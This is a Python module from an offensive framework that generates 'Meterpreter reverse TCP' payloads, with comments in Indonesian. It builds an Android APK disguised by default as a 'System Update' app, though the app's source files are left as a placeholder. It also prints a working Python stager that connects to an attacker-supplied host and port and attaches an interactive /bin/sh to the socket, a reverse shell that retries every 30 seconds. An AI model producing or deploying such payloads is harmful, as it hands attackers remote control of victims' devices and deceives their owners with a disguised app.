#!/usr/bin/env python3
# -*- coding: utf-8 -*-

MODULE_INFO = {
    "name": "MEGA Meterpreter Reverse TCP",
    "description": "Generate EXE, ELF, APK, Python Stager",
    "author": "Lazy Framework",
    "license": "MIT",
    "platform": "multi",
    "arch": "x86/x64/arm",
    "type": "payload",
    "rank": "MEGA",
    "dependencies": ["rich", "pyinstaller"]
}

OPTIONS = {
    "LHOST": {"description": "Listener IP", "required": True},
    "LPORT": {"description": "Listener Port", "required": True, "default": "4444"},
    "PLATFORM": {"description": "windows/linux/android", "required": False, "default": "windows"},
    "ARCH": {"description": "x86/x64", "required": False, "default": "x64"},
    "APP_NAME": {"description": "Android app name", "required": False, "default": "System Update"},
    "PACKAGE_NAME": {"description": "Android package", "required": False, "default": "com.system.update"},
    "ICON": {"description": "Custom icon", "required": False, "default": ""}
}

import os
import sys
import shutil
import subprocess
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

console = Console()
java_home = "/usr/lib/jvm/jdk-21"  # Gantilah dengan path JDK Anda
os.environ['JAVA_HOME'] = java_home

# Update PATH
os.environ['PATH'] = os.environ['JAVA_HOME'] + "/bin:" + os.environ['PATH']

# JAR SUDAH ADA DI SERVER!
LOCAL_GRADLE_WRAPPER = Path("/root/T/gradle-9.2.0/gradle/wrapper")
GRADLE_VERSION = "9.2.0"

# AUTO DETECT JDK 21 DARI SEMUA TEMPAT
POSSIBLE_JDK_PATHS = [
                     # Custom dari kamu
    "/usr/lib/jvm/jdk-21",
]

class MegaPayloadGenerator:
    def __init__(self, options):
        self.o = options
        self.lhost = options["LHOST"]
        self.lport = int(options["LPORT"])
        self.platform = options.get("PLATFORM", "windows").lower()
        self.app_name = options.get("APP_NAME", "System Update")
        self.package = options.get("PACKAGE_NAME", "com.system.update")

    def _setup_java_env(self):
        """Auto set JAVA_HOME + PATH jika belum ada Java 21"""
        java_bin = None

        # 1. Cek PATH dulu
        java_bin = shutil.which("java")
        if java_bin and self._is_java_21(java_bin):
            console.print(f"[green]Java 21 detected in PATH: {java_bin}[/green]")
            return java_bin

        # 2. Cari di POSSIBLE_JDK_PATHS
        for base in POSSIBLE_JDK_PATHS:
            candidate = Path(base) / "bin" / "java"
            if candidate.exists() and self._is_java_21(str(candidate)):
                java_bin = str(candidate)
                # SET JAVA_HOME & PATH SECARA OTOMATIS
                java_home = str(Path(base))
                os.environ["JAVA_HOME"] = java_home
                os.environ["PATH"] = f"{java_home}/bin:{os.environ.get('PATH', '')}"
                console.print(f"[bold green]Auto-set JAVA_HOME: {java_home}[/bold green]")
                console.print(f"[bold green]Using Java 21: {java_bin}[/bold green]")
                return java_bin

        return None

    def _is_java_21(self, java_path) -> bool:
        try:
            result = subprocess.run(
                [java_path, "-version"],
                capture_output=True, text=True, stderr=subprocess.STDOUT
            )
            output = result.stderr or result.stdout
            return "21" in output and ("openjdk" in output.lower() or "jdk" in output.lower())
        except:
            return False

    def _copy_jar_from_local(self, wrapper_dir: Path):
        src_jar = LOCAL_GRADLE_WRAPPER / "gradle-wrapper.jar"
        dst_jar = wrapper_dir / "gradle-wrapper.jar"

        if not src_jar.exists():
            return "[red]Local JAR not found! Check /root/T/gradle-9.2.0/gradle/wrapper/gradle-wrapper.jar[/red]"

        try:
            if not dst_jar.exists() or dst_jar.stat().st_size != 46080:
                shutil.copy2(src_jar, dst_jar)
                console.print(f"[green]JAR copied: {dst_jar} (45 KB)[/green]")
            else:
                console.print(f"[green]JAR OK: {dst_jar} (45 KB)[/green]")
            return None
        except Exception as e:
            return f"[red]Copy failed: {e}[/red]"

    def _setup_gradle_wrapper(self, project_dir: Path):
        wrapper_dir = project_dir / "gradle" / "wrapper"
        wrapper_dir.mkdir(parents=True, exist_ok=True)

        props = f"""distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\\://services.gradle.org/distributions/gradle-{GRADLE_VERSION}-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
"""
        (wrapper_dir / "gradle-wrapper.properties").write_text(props.strip() + "\n", encoding="utf-8")

        gradlew_path = project_dir / "gradlew"
        gradlew_content = """#!/bin/sh
DIR="$(cd "$(dirname "$0")" && pwd)"
exec java -jar "$DIR/gradle/wrapper/gradle-wrapper.jar" "$@"
"""
        gradlew_path.write_text(gradlew_content.strip() + "\n", encoding="utf-8")
        gradlew_path.chmod(0o755)

        (project_dir / "gradlew.bat").write_text("""@echo off
set DIR=%~dp0
java -jar "%DIR%gradle\\wrapper\\gradle-wrapper.jar" %*
""".strip() + "\r\n", encoding="utf-8")

        return self._copy_jar_from_local(wrapper_dir)

    def generate_apk(self):
        if self.platform != "android":
            return "[yellow]Set PLATFORM=android[/yellow]"

        project_dir = Path("mega_android").resolve()
        jar_path = project_dir / "gradle" / "wrapper" / "gradle-wrapper.jar"

        try:
            if project_dir.exists():
                shutil.rmtree(project_dir, ignore_errors=True)

            # Setup project files (sama seperti sebelumnya)
            java_dir = project_dir / "app" / "src" / "main" / "java" / "com" / "mega" / "payload"
            java_dir.mkdir(parents=True, exist_ok=True)
            (project_dir / "app" / "src" / "main" / "res").mkdir(parents=True, exist_ok=True)

            # [MainActivity.java, AndroidManifest.xml, build.gradle] → sama

            # Setup wrapper
            err = self._setup_gradle_wrapper(project_dir)
            if err:
                return err

            if not jar_path.exists():
                return f"[red]JAR missing: {jar_path}[/red]"

            # AUTO SETUP + DETECT JAVA 21
            java_bin = self._setup_java_env()
            if not java_bin:
                return ("[red]Java 21 not found![/red]\n"
                        "   [bold cyan]Cek: ls /jdk-21.0.9/bin/java[/bold cyan]\n"
                        "   [bold yellow]Atau: apt install openjdk-21-jdk[/bold yellow]")

            os.chdir(project_dir)
            cmd = [java_bin, "-jar", str(jar_path), "assembleRelease", "--no-daemon"]

            console.print("[*] Building APK (Auto Java 21)...", style="bold yellow")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

            if result.returncode == 0:
                apk_src = project_dir / "app" / "build" / "outputs" / "apk" / "release" / "app-release-unsigned.apk"
                if apk_src.exists():
                    shutil.copy2(apk_src, Path.cwd().parent / "MEGA_payload.apk")
                    return "[green]MEGA APK: MEGA_payload.apk[/green]"
                else:
                    return "[red]APK not found[/red]"
            else:
                return f"[red]Build failed:[/red]\n{result.stderr[:500]}"

        except Exception as e:
            return f"[red]APK Error: {e}[/red]"
        finally:
            try:
                os.chdir(Path(__file__).parent)
            except:
                pass
            if project_dir.exists():
                shutil.rmtree(project_dir, ignore_errors=True)

    def generate_python_stager(self):
        return f'''#!/usr/bin/env python3
import socket, subprocess, time
while True:
    try:
        s = socket.create_connection(("{self.lhost}", {self.lport}))
        s.send(b"MEGA_METERPRETER\\n")
        subprocess.Popen(["/bin/sh","-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
        break
    except: time.sleep(30)
'''

def run(session, options):
    gen = MegaPayloadGenerator(options)
    console.print(Panel(f"[bold red]MEGA METERPRETER[/bold red] | {options['LHOST']}:{options['LPORT']} | Auto Java 21", style="bold red"))

    if options.get("PLATFORM") == "android":
        result = gen.generate_apk()
    else:
        result = "[yellow]Use PLATFORM=android[/yellow]"

    console.print(result)

    stager = gen.generate_python_stager()
    console.print("\n[bold]Python Stager:[/bold]")
    console.print(Syntax(stager, "python", theme="dracula", line_numbers=True))
